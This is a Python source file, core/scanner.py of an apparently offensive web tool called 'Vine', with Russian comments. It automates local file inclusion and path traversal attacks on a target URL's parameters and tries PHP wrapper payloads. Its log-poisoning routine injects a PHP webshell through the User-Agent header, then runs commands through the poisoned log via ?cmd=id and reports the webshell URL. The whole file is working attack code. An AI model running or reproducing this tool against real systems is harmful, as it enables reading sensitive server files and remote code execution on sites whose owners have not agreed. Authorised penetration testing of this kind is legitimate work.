"""
Vine · core/scanner.py
Движок сканирования. Запускается в QThread — общается с UI через коллбэки/сигналы.
"""

from __future__ import annotations

import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from typing import Callable

import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning  # type: ignore

from core.payloads import Payload, generate_payloads, generate_quick_payloads, load_wordlist, get_patterns, TARGET_FILES
from core.wrappers import (
    WrapperPayload, generate_wrapper_payloads,
    get_wrapper_patterns, decode_wrapper_response,
    LOG_PATHS_LINUX, build_poison_request_headers, PHP_WEBSHELL,
    LogPoisonResult, RCE_PATTERNS, WRAPPER_TECHNIQUE_LABELS,
)

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


# ── Конфигурация сканирования ────────────────────────────────────────────────

@dataclass
class ScanConfig:
    url: str
    params: list[str]

    os_type: str = "linux"
    depth: int = 8
    threads: int = 10
    timeout: int = 10
    delay: float = 0.0

    encodings: list[str] = field(default_factory=lambda: ["plain"])
    cookies: dict[str, str] = field(default_factory=dict)
    extra_headers: dict[str, str] = field(default_factory=dict)
    proxy: str | None = None

    method: str = "GET"                   # GET или POST
    post_data: dict[str, str] = field(default_factory=dict)
    use_wrappers: bool = False
    wrappers_rce: bool = False
    use_log_poison: bool = False
    quick_scan: bool = False               # ~100 payloads вместо тысяч
    wordlist_path: str = ""                # путь к кастомному wordlist

    def target_files(self) -> list[str]:
        return TARGET_FILES.get(self.os_type, TARGET_FILES["linux"])


# ── Результат одного срабатывания ────────────────────────────────────────────

@dataclass
class Finding:
    param: str
    payload: Payload
    status_code: int
    response_length: int
    baseline_length: int
    matched_pattern: str
    url: str
    elapsed_ms: int
    timestamp: float = field(default_factory=time.time)

    method: str = "GET"                   # GET / POST
    is_wrapper: bool = False               # True если wrapper payload
    decoded_content: str = ""             # декодированный контент (base64/rot13)

    @property
    def size_delta(self) -> int:
        return self.response_length - self.baseline_length


# ── Статистика прогона ────────────────────────────────────────────────────────

@dataclass
class ScanStats:
    total: int = 0
    done: int = 0
    found: int = 0
    errors: int = 0
    started_at: float = field(default_factory=time.time)

    @property
    def elapsed(self) -> float:
        return time.time() - self.started_at

    @property
    def progress(self) -> float:
        return self.done / self.total if self.total else 0.0


# ── Движок ───────────────────────────────────────────────────────────────────

class ScanEngine:
    """
    Движок сканирования. Не зависит от Qt.

    Коллбэки (все вызываются из рабочих потоков — в QThread нужно
    пробрасывать через сигналы):

      on_log(msg: str, level: str)      — строка лога, level: info/ok/warn/found/error
      on_finding(finding: Finding)      — обнаружена уязвимость
      on_progress(stats: ScanStats)     — обновление прогресса
      on_finished(stats: ScanStats)     — сканирование завершено
    """

    def __init__(
        self,
        config: ScanConfig,
        on_log: Callable[[str, str], None] | None = None,
        on_finding: Callable[[Finding], None] | None = None,
        on_progress: Callable[[ScanStats], None] | None = None,
        on_finished: Callable[[ScanStats], None] | None = None,
    ):
        self.config = config
        self.on_log      = on_log      or (lambda m, l: None)
        self.on_finding  = on_finding  or (lambda f: None)
        self.on_progress = on_progress or (lambda s: None)
        self.on_finished = on_finished or (lambda s: None)

        self._stop = False
        self._session: requests.Session | None = None

    # ── Публичный API ────────────────────────────────────────────────────────

    def stop(self):
        self._stop = True

    def run(self):
        """Основной метод — вызвать из QThread.run() или напрямую."""
        self._stop = False
        self._session = self._build_session()

        cfg = self.config
        self._log(f"VINE · Marquis of Secrets", "info")
        self._log(f"target   {cfg.url}", "info")
        self._log(f"params   {', '.join(cfg.params)}", "info")
        self._log(f"os       {cfg.os_type}  depth={cfg.depth}  threads={cfg.threads}", "info")
        self._log(f"encodings  {', '.join(cfg.encodings)}", "info")
        if cfg.proxy:
            self._log(f"proxy    {cfg.proxy}", "info")
        self._log("", "info")

        # Baselines
        baselines: dict[str, int] = {}
        for param in cfg.params:
            bl = self._baseline(param)
            baselines[param] = bl
            self._log(f"baseline  {param} → {bl} bytes", "info")
        self._log("", "info")

        # Генерация payloads
        if cfg.quick_scan:
            payloads = generate_quick_payloads(cfg.os_type)
            self._log("mode      QUICK SCAN (~100 payloads)", "warn")
        elif cfg.wordlist_path:
            try:
                payloads = load_wordlist(cfg.wordlist_path)
                self._log(f"mode      WORDLIST · {len(payloads)} paths · {cfg.wordlist_path}", "warn")
            except Exception as e:
                self._log(f"wordlist error: {e} — falling back to default", "error")
                payloads = generate_payloads(cfg.target_files(), cfg.depth, cfg.encodings)
        else:
            payloads = generate_payloads(cfg.target_files(), cfg.depth, cfg.encodings)

        # Все задачи: param × payload
        tasks = [(param, p) for param in cfg.params for p in payloads]

        stats = ScanStats(total=len(tasks))
        self._log(f"payloads  {len(tasks)} generated", "info")
        self._log("", "info")
        self._log("invoking traversal sequences...", "ok")

        findings: list[Finding] = []
        # Dedup: (param, target_file) → лучшая находка
        # "strong" паттерн вытесняет эвристику; одинаковые файлы не дублируются
        _seen: dict[tuple, str] = {}   # ключ → тип: "strong" | "heuristic"

        with ThreadPoolExecutor(max_workers=cfg.threads) as pool:
            futures = {
                pool.submit(self._probe, param, payload, baselines[param]): (param, payload)
                for param, payload in tasks
            }

            for future in as_completed(futures):
                if self._stop:
                    break

                stats.done += 1

                try:
                    finding = future.result()
                except Exception as exc:
                    stats.errors += 1
                    self._log(f"error: {exc}", "error")
                    finding = None

                if finding:
                    key = (finding.param, finding.payload.target_file)
                    is_strong = not finding.matched_pattern.startswith("size_delta")
                    prev = _seen.get(key)

                    # Пропускаем если уже есть strong для этого файла
                    if prev == "strong":
                        stats.done  # просто считаем
                    # Принимаем если: ещё не видели, или заменяем эвристику на strong
                    elif prev is None or (prev == "heuristic" and is_strong):
                        _seen[key] = "strong" if is_strong else "heuristic"
                        if prev == "heuristic":
                            # Заменяем предыдущую эвристику — убираем из findings
                            findings = [f for f in findings
                                        if not (f.param == finding.param
                                                and f.payload.target_file == finding.payload.target_file)]
                            stats.found -= 1

                        stats.found += 1
                        findings.append(finding)
                        self._log(
                            f"✦ REVEALED   {finding.payload.target_file}"
                            f"   param={finding.param}"
                            f"   enc={finding.payload.encoding}",
                            "found",
                        )
                        self._log(
                            f"    pattern: {finding.matched_pattern}"
                            f"   +{finding.size_delta} bytes   {finding.elapsed_ms}ms",
                            "info",
                        )
                        self._log(f"    payload: {finding.payload.raw[:80]}", "info")
                        self.on_finding(finding)

                if stats.done % 50 == 0 or finding:
                    self.on_progress(stats)

                if cfg.delay:
                    time.sleep(cfg.delay)

        # ── PHP Wrappers ────────────────────────────────────────────────────
        if cfg.use_wrappers and not self._stop:
            self._log("", "info")
            self._log("invoking php wrappers...", "ok")
            wrapper_payloads = generate_wrapper_payloads(
                cfg.target_files(), include_rce=cfg.wrappers_rce
            )
            for param in cfg.params:
                for wp in wrapper_payloads:
                    if self._stop:
                        break
                    finding = self._probe_wrapper(param, wp, baselines.get(param, 0))
                    if finding:
                        stats.found += 1
                        findings.append(finding)
                        self._log(
                            f"✦ WRAPPER   {wp.target_file}"
                            f"   technique={wp.technique}"
                            f"   param={param}",
                            "found",
                        )
                        if finding.decoded_content:
                            preview = finding.decoded_content[:80].replace("\n", " ")
                            self._log(f"    decoded: {preview}...", "info")
                        self.on_finding(finding)
                        self.on_progress(stats)

        # ── Log Poisoning ────────────────────────────────────────────────────
        if cfg.use_log_poison and not self._stop:
            # Запускаем только если нашли доступный лог в traversal
            accessible_logs = [
                f for f in findings
                if any(log in f.payload.target_file for log in ["access.log", "error.log", "auth.log"])
            ]
            if accessible_logs:
                self._log("", "info")
                self._log(f"accessible logs found ({len(accessible_logs)}) — attempting log poisoning...", "warn")
                for log_finding in accessible_logs:
                    if self._stop:
                        break
                    result = self._log_poison(log_finding)
                    if result:
                        stats.found += 1
                        self._log(
                            f"✦ LOG POISON RCE   {result.log_path}",
                            "found",
                        )
                        self._log(f"    output: {result.command_output[:80]}", "info")
                        self._log(f"    webshell: {result.webshell_url}", "info")
            else:
                self._log("", "info")
                self._log("log poisoning: no accessible logs found in traversal results", "warn")
                self._log("  tip: enable traversal scan first, or add logs manually", "info")

        self._log("", "info")
        self._log(
            f"ritual complete · {stats.done}/{stats.total}"
            f" · {stats.found} revealed · {stats.elapsed:.1f}s",
            "ok" if stats.found else "warn",
        )

        self.on_progress(stats)
        self.on_finished(stats)

    # ── Внутренние методы ────────────────────────────────────────────────────

    def _build_session(self) -> requests.Session:
        s = requests.Session()
        s.headers.update({
            "User-Agent": (
                "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) "
                "Gecko/20100101 Firefox/115.0"
            ),
            **self.config.extra_headers,
        })
        s.cookies.update(self.config.cookies)
        if self.config.proxy:
            s.proxies = {
                "http":  self.config.proxy,
                "https": self.config.proxy,
            }
        return s

    def _baseline(self, param: str) -> int:
        url = self._build_url(param, "index")
        try:
            r = self._session.get(url, timeout=self.config.timeout, verify=False)
            return len(r.content)
        except Exception:
            return 0

    def _probe(self, param: str, payload: Payload, baseline: int) -> Finding | None:
        if self._stop:
            return None

        t0 = time.monotonic()
        try:
            if self.config.method == "POST":
                url = self.config.url
                post_data = dict(self.config.post_data)
                post_data[param] = payload.encoded
                resp = self._session.post(
                    url, data=post_data,
                    timeout=self.config.timeout,
                    verify=False, allow_redirects=True,
                )
            else:
                url = self._build_url(param, payload.encoded)
                resp = self._session.get(
                    url, timeout=self.config.timeout,
                    verify=False, allow_redirects=True,
                )
        except requests.RequestException:
            return None

        elapsed_ms = int((time.monotonic() - t0) * 1000)
        body = resp.text
        resp_len = len(resp.content)
        actual_url = resp.url if self.config.method == "GET" else self.config.url

        matched = self._check(body, resp_len, baseline, payload.target_file)
        if not matched:
            return None

        return Finding(
            param=param,
            payload=payload,
            status_code=resp.status_code,
            response_length=resp_len,
            baseline_length=baseline,
            matched_pattern=matched,
            url=actual_url if self.config.method == "GET" else f"{url} [POST:{param}={payload.encoded[:30]}]",
            elapsed_ms=elapsed_ms,
            method=self.config.method,
        )

    def _probe_wrapper(self, param: str, wp: WrapperPayload, baseline: int) -> Finding | None:
        """Проверяет один PHP wrapper payload."""
        if self._stop:
            return None

        # Собираем фиктивный Payload для совместимости с Finding
        p = Payload(
            raw=wp.raw, encoded=wp.encoded,
            target_file=wp.target_file,
            technique=wp.technique,
            encoding="wrapper",
        )

        t0 = time.monotonic()
        try:
            if self.config.method == "POST":
                resp = self._session.post(
                    self.config.url,
                    data={**self.config.post_data, param: wp.encoded},
                    timeout=self.config.timeout, verify=False,
                )
                url = f"{self.config.url} [POST:{param}]"
            else:
                url = self._build_url(param, wp.encoded)
                resp = self._session.get(
                    url, timeout=self.config.timeout, verify=False,
                )
        except requests.RequestException:
            return None

        elapsed_ms = int((time.monotonic() - t0) * 1000)
        body = resp.text
        resp_len = len(resp.content)

        # Для base64/rot13 — проверяем наличие длинной закодированной строки
        decoded = None
        if wp.needs_decode:
            decoded = decode_wrapper_response(body, wp.technique)
            if not decoded or len(decoded) < 10:
                return None
            # Паттерн-матч на декодированном контенте
            patterns = get_patterns(wp.target_file)
            matched = ""
            for pat in patterns:
                if pat and pat in decoded:
                    matched = pat
                    break
            if not matched:
                # Любой осмысленный декодированный текст — это уже успех для wrappers
                matched = f"wrapper:decoded({len(decoded)}b)"
        else:
            patterns = get_wrapper_patterns(wp.technique) or get_patterns(wp.target_file)
            matched = ""
            body_lower = body.lower()
            for err in self._ERROR_PHRASES:
                if err in body_lower:
                    return None
            for pat in patterns:
                if pat and pat in body:
                    matched = pat
                    break
            if not matched:
                return None

        return Finding(
            param=param,
            payload=p,
            status_code=resp.status_code,
            response_length=resp_len,
            baseline_length=baseline,
            matched_pattern=matched,
            url=url,
            elapsed_ms=elapsed_ms,
            method=self.config.method,
            is_wrapper=True,
            decoded_content=decoded or "",
        )

    def _log_poison(self, log_finding: "Finding") -> LogPoisonResult | None:
        """
        Log Poisoning атака:
        1. Отправить запрос с PHP-шеллом в User-Agent
        2. Прочитать лог через найденный LFI payload
        3. Добавить ?cmd=id и проверить выполнение
        """
        log_path = log_finding.payload.target_file
        lfi_url  = log_finding.url
        param    = log_finding.param
        payload  = log_finding.payload.encoded

        self._log(f"  poisoning {log_path}...", "info")

        # Шаг 1: отравить лог — отправить запрос с PHP в User-Agent
        try:
            poison_session = requests.Session()
            if self.config.proxy:
                poison_session.proxies = {"http": self.config.proxy, "https": self.config.proxy}
            poison_session.get(
                self.config.url,
                headers=build_poison_request_headers(),
                timeout=self.config.timeout,
                verify=False,
            )
        except Exception:
            return None

        # Шаг 2: читать лог с ?cmd=id
        try:
            cmd_url = lfi_url + "&cmd=id" if "?" in lfi_url else lfi_url + "?cmd=id"
            resp = self._session.get(
                cmd_url, timeout=self.config.timeout, verify=False
            )
            body = resp.text

            # Проверяем RCE
            for pattern in RCE_PATTERNS:
                if pattern in body:
                    # Вытащить вывод команды
                    import re
                    match = re.search(r"uid=\d+\([^)]+\)\S*", body)
                    output = match.group(0) if match else pattern

                    return LogPoisonResult(
                        log_path=log_path,
                        log_url=lfi_url,
                        rce_confirmed=True,
                        command_output=output,
                        payload_used=PHP_WEBSHELL,
                        webshell_url=cmd_url,
                    )
        except Exception:
            pass

        return None

    # Фразы говорящие что файл НЕ прочитан или пустой
    _ERROR_PHRASES = (
        "file not found", "no such file", "failed to open",
        "permission denied", "not found", "invalid path",
        "illegal path", "access denied", "open_basedir",
        "warning: include", "warning: require", "failed opening",
        "file is empty",   # vine-lab: файл существует но пустой
    )

    # Файлы для которых эвристика размера ОТКЛЮЧЕНА —
    # только паттерн-матч, иначе слишком много ложных срабатываний
    _PATTERN_ONLY_FILES = (
        "access.log", "error.log", "auth.log",
        "syslog", "messages", "kern.log",
    )

    def _check(
        self,
        body: str,
        resp_len: int,
        baseline: int,
        target_file: str,
    ) -> str:
        """
        Возвращает совпавший паттерн или \'\' если ничего.

        Логика:
          1. Есть фраза ошибки → точно нет
          2. Есть паттерн содержимого → подтверждено
          3. Файл из pattern-only списка → только паттерн, эвристика не применяется
          4. Резкий рост размера → вероятно (эвристика, желтый индикатор)
        """
        body_lower = body.lower()

        # 1. Явные признаки ошибки — сервер не отдал файл
        for err in self._ERROR_PHRASES:
            if err in body_lower:
                return ""

        # 2. Паттерн-матч — надёжное подтверждение
        for pattern in get_patterns(target_file):
            if pattern and pattern in body:
                return pattern

        # 3. Для логов и системных файлов только паттерн, без эвристики
        #    Пустой лог существует, но нам он не интересен
        for suffix in self._PATTERN_ONLY_FILES:
            if target_file.endswith(suffix):
                return ""

        # 4. Эвристика: резкий рост размера
        #    Высокий порог чтобы снизить ложные срабатывания
        if (
            resp_len > baseline + 500
            and resp_len > baseline * 1.6
            and baseline > 0
        ):
            return f"size_delta(+{resp_len - baseline})"

        return ""

    def _build_url(self, param: str, value: str) -> str:
        parsed = urllib.parse.urlparse(self.config.url)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        qs[param] = [value]
        new_query = urllib.parse.urlencode(qs, doseq=True)
        return urllib.parse.urlunparse(parsed._replace(query=new_query))

    def _log(self, msg: str, level: str):
        self.on_log(msg, level)
